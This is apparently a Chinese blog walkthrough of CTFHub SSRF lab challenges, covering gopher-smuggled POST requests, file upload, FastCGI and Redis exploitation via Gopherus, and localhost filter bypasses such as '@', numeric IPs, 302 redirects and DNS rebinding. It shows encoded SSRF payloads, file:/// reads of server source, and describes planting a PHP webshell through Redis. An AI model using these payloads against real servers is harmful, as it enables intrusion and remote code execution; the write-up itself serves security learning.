---
title: CTFHub--SSRF
date: 2021-09-23 14:06
updated: 2021-09-23 14:06
categories: CTFHub
tags: [SSRF]
toc: true
---
CTFHub-SSRF
<!-- more -->

## 一、Post请求

**1.先用伪协议尝试读取index.php和flag.php文件**

![img](https://img-blog.csdnimg.cn/20210817184540249.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)以下为index.php源代码

![](https://img-blog.csdnimg.cn/20210817184746833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNzEwMzMx,size_16,color_FFFFFF,t_70)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

再看flag.php里出现了一串奇怪的key，利用curl和gopher协议POST数据到flag.php即可

key=88e24a185b1471ea34764dfb6129c7d7

思路：往index.php里传入我们的payload

>  /?url=127.0.0.1:80/index.php?url=gopher://POST包

**2.构造post请求**

> 注意项： ①对构造的post包进行三次URL编码，本体一次，传入index一次，跳转到flag一次
>
> ②编码第一次后的%0A全部替换成%0D%0A
>
> ③content-length为最后一行的长度，即post数据的大小

```html
POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

key=8a6d748f4f820709cd9e444991d49dd0
```

![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

进行三次编码修改后可得：

POST%252520/flag.php%252520HTTP/1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Type%25253A%252520application/x-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253D88e24a185b1471ea34764dfb6129c7d7



**3.发送请求**

> gopher协议格式：URL:gopher://<host>:<port>/<gopher-path>_后接TCP数据流
>
> ?url=127.0.0.1/index.php/?url=gopher://127.0.0.1:80/_POST包

 如图发送数据包即可返回两个HTTP请求（右边两次 200 OK）

![](https://img-blog.csdnimg.cn/20210817185914615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNzEwMzMx,size_16,color_FFFFFF,t_70)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

> 注意：要进行两次?url=跳转，第一次转到127.0.0.1/index.php后，再将?url=构造的post包传入index.php后才可成功获取flag,否则返回错误

## 二、上传文件

 **1.构造file伪协议payload查看index.php和flag.php源代码**

> ?url=file:///var/www/html/index.php(flag.php)

发现此题跟上题类似，只是这次需要post上传的是一个文件 

![](https://img-blog.csdnimg.cn/20210817184746833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNzEwMzMx,size_16,color_FFFFFF,t_70)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)![](https://img-blog.csdnimg.cn/20210817195612903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNzEwMzMx,size_16,color_FFFFFF,t_70)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

 **2.网页中没有提交按钮，修改源代码添加提交按钮**

```html
<input type="submit" name="submit">
```

![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/2021081719584197.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![img](https://img-blog.csdnimg.cn/20210817203643799.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

**3.提交文件，并抓包，这个包就是我们要构造的POST包** 

![](https://img-blog.csdnimg.cn/20210817203127709.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNzEwMzMx,size_16,color_FFFFFF,t_70)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

>  编码左边请求包--->编码一次修改%0A为%0D%0A后，再连续编码两次

 **4.构造payload发送请求**

> ?url=127.0.0.1/index.php/?url=gopher://127.0.0.1:80/_POST包

![](https://img-blog.csdnimg.cn/20210817201438624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNzEwMzMx,size_16,color_FFFFFF,t_70)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==) 成功获取flag！

## 三、FastCGI协议

协议具体介绍和漏洞分析如下链接

[Fastcgi协议分析 && PHP-FPM未授权访问漏洞](https://blog.csdn.net/mysteryflower/article/details/94386461)

网上已经有很多利用nc 和exp解题的操作，这里使用Gopherus工具来构造payload

> 很多教程都是使用 /usr/local/lib/php/PEAR.php
>
> 实测发现：/var/www/html/index.php即可使用

**1. 直接在gopherus中输入PHP文件后加上命令即可：ls**

将得到的payload再次进行URL编码，是协议后面那串进行第二次编码

之后用burp抓包加上gopher协议并发送，返回了ls的结果，并没有发现flag相关文件

![](https://img-blog.csdnimg.cn/20210819125653669.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNzEwMzMx,size_16,color_FFFFFF,t_70)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

 ![](https://img-blog.csdnimg.cn/2021081912583993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNzEwMzMx,size_16,color_FFFFFF,t_70)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

 **2.使用查找命令: find / -name flag\***

编码操作如上，发现最后一个文件应该就是要找的flag文件

![](https://img-blog.csdnimg.cn/20210819125724215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNzEwMzMx,size_16,color_FFFFFF,t_70)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

 **3.使用cat命令查看文件**

![](https://img-blog.csdnimg.cn/20210819125707825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNzEwMzMx,size_16,color_FFFFFF,t_70)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

 成功拿到flag！

>  附上另一个大佬写的博客，看了很有启发：[SSRF 学习之 ctfhub靶场-FastCGI - soapffz's blog](https://www.soapffz.com/sec/ctf/566.html)

## 四、Redis协议

[浅析Redis中SSRF的利用 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/5665#toc-8)---前置知识

此题是利用gopher写入木马文件，执行命令，最后拿到flag

**1.构造Redis命令（在这里我使用的是Gopherus工具）**

构造一句话代码的Redis命令

![](https://img-blog.csdnimg.cn/20210819211021194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNzEwMzMx,size_16,color_FFFFFF,t_70)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)**2.再次编码并利用gopher协议,burp抓包发送**

![](https://img-blog.csdnimg.cn/20210819211435913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNzEwMzMx,size_16,color_FFFFFF,t_70)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

**3.尝试用蚁剑访问shell.php**

访问成功并找到flag文件

![](https://img-blog.csdnimg.cn/20210819211538638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNzEwMzMx,size_16,color_FFFFFF,t_70)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

## 五、几道IP绕过

[常用绕过方法---链接](https://zhuanlan.zhihu.com/p/73736127)

- locahost绕过
- 利用@
- 进制转换绕过
- 短网址访问
- 利用句号：127。0。0。1 >>> 127.0.0.1
- 利用[http://xip.io](https://link.zhihu.com/?target=http%3A//xip.io)和xip.name绕过
- 利用Enclosed alphanumerics绕过

### 1.URL Bypass

> 根据提示构造：?url=http://notfound.ctfhub.com@127.0.0.1/flag.php

### ![](https://img-blog.csdnimg.cn/20210820171631309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNzEwMzMx,size_16,color_FFFFFF,t_70)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)2.数字IP Bypass

当特定IP数字被过滤时，可以考虑用其他进制代替

- 例如：127.0.0.1可以转换为： 

  - 十六进制 = 0x7F000001

  - 十进制 = 2130706433

 ![](https://img-blog.csdnimg.cn/20210820173747861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNzEwMzMx,size_16,color_FFFFFF,t_70)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20210820173814675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNzEwMzMx,size_16,color_FFFFFF,t_70)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

> 或者使用localhost代替127.0.0.1也可 

### 3. 302跳转 Bypass

直接访问flag.php，提示要让我们从?url=127.0.0.1中访问

![](https://img-blog.csdnimg.cn/20210820175446419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNzEwMzMx,size_16,color_FFFFFF,t_70)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

访问发现该地址被过滤了 

![](https://img-blog.csdnimg.cn/20210820175534572.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

 我们可以用file:///协议看下index.php的源代码

![](https://img-blog.csdnimg.cn/20210820175633520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNzEwMzMx,size_16,color_FFFFFF,t_70)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

 仅仅过滤了数字，用进制绕过或者localhost绕过皆可成功

![](https://img-blog.csdnimg.cn/20210820175750576.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

###  4.DNS重绑定 Bypass

[题目附件资料](https://zhuanlan.zhihu.com/p/89426041)

**这道题可以照搬第三题的方法，查看源代码后尝试用localhost和进制转换来绕过，发现成功**

> 下面是使用DNS绑定攻击，参考文章：[CTFHub技能树 Web-SSRF DNS重绑定 Bypass_Senimo-CSDN博客](https://senimo.blog.csdn.net/article/details/118486190)

![img](https://img-blog.csdnimg.cn/202108201811036.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNzEwMzMx,size_16,color_FFFFFF,t_70)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

 理解原理之后，用文章中的链接工具，达到攻击效果

> 通过[rbndr.us dns rebinding service](https://lock.cmpxchg8b.com/rebinder.html)网站设置DNS
>
> ![](https://img-blog.csdnimg.cn/20210820181717276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNzEwMzMx,size_16,color_FFFFFF,t_70)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20210820181445766.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNzEwMzMx,size_16,color_FFFFFF,t_70)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

**SSRF部分到此结束，收获颇多！** 

